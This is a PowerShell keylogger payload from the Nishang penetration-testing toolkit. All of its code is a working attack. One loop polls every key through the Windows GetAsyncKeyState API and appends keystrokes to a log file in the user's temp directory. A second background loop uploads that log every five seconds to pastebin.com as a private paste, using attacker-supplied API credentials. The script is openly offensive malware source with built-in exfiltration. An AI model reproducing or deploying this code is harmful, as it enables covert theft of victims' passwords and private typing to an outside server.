<#
.SYNOPSIS
Nishang Payload which logs keys.

.DESCRIPTION
This payload logs a user's keys and writes them to file key.log (I know its bad :|) in users temp directory.
The keys are than pasted to pastebin as a private paste.

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.

.PARAMETER username
Username for the pastebin account where you would upload the data.

.PARAMETER password
Password for the pastebin account where you would upload the data.

.EXAMPLE
PS > .\Keylogger.ps1 <pastebindev_key> <pastebinusername> <pastebinpass>

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>



Param ( [Parameter(Position = 0, Mandatory = $True)] [String] $dev_key,
[Parameter(Position = 1, Mandatory = $True)] [String]$username,
[Parameter(Position = 2, Mandatory = $True)] [String]$password )

$functions = {


function Keylogger
{
$signature = @' 
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@ 
$getKeyState = Add-Type -memberDefinition $signature -name "Win32GetState" -namespace Win32Functions -passThru 
while ($true) 
{ 
Start-Sleep -Milliseconds 40 
$logged = "" 
$result="" 
$shift_state="" 
$caps_state="" 
for ($char=1;$char -le 254;$char++) 
{ 
$vkey = $char 
$logged = $getKeyState::GetAsyncKeyState($vkey) 
if ($logged -eq -32767) 
{ 
if(($vkey -ge 48) -and ($vkey -le 57)) 
{ 
$left_shift_state = $getKeyState::GetAsyncKeyState(160) 
$right_shift_state = $getKeyState::GetAsyncKeyState(161) 
if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
{ 
$result = "S-" + $vkey 
} 
else 
{ 
$result = $vkey 
} 
} 
elseif(($vkey -ge 64) -and ($vkey -le 90)) 
{ 
$left_shift_state = $getKeyState::GetAsyncKeyState(160) 
$right_shift_state = $getKeyState::GetAsyncKeyState(161) 
$caps_state = [console]::CapsLock 
if(!(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) -xor $caps_state) 
{ 
$result = "S-" + $vkey 
} 
else 
{ 
$result = $vkey 
} 
} 
elseif((($vkey -ge 186) -and ($vkey -le 192)) -or (($vkey -ge 219) -and ($vkey -le 222))) 
{ 
$left_shift_state = $getKeyState::GetAsyncKeyState(160) 
$right_shift_state = $getKeyState::GetAsyncKeyState(161) 
if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
{ 
$result = "S-" + $vkey 
} 
else 
{ 
$result = $vkey 
} 
} 
else 
{ 
$result = $vkey 
} 
$now = Get-Date; 
$logLine = "$result " 
$filename = "$env:temp\key.log" 
Out-File -FilePath $fileName -Append -InputObject "$logLine" 
}}}}

function Keypaste
{
Param ( [Parameter(Position = 0, Mandatory = $True)] [String] $dev_key,
[Parameter(Position = 1, Mandatory = $True)] [String]$username,
[Parameter(Position = 2, Mandatory = $True)] [String]$password )
$dev_key
$username
$password
while($true) 
{ 
Start-Sleep -Seconds 5 
$pastevalue=Get-Content $env:temp\key.log 
$now = Get-Date; 
$paste_name = $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff") 
$session_key 
Function Post_http($url,$parameters) 
{ 
$http_request = New-Object -ComObject Msxml2.XMLHTTP 
$http_request.open("POST", $url, $false) 
$http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
$http_request.setRequestHeader("Content-length", $parameters.length); 
$http_request.setRequestHeader("Connection", "close") 
$http_request.send($parameters) 
$script:session_key=$http_request.responseText 
$session_key 
} 
Post_http "http://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
Post_http "http://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$paste_name&api_paste_code=$pastevalue&api_paste_private=2" 
} 
}

}

start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1] $args[2]} -ArgumentList @($dev_key,$username,$password)
start-job -InitializationScript $functions -scriptblock {Keylogger}
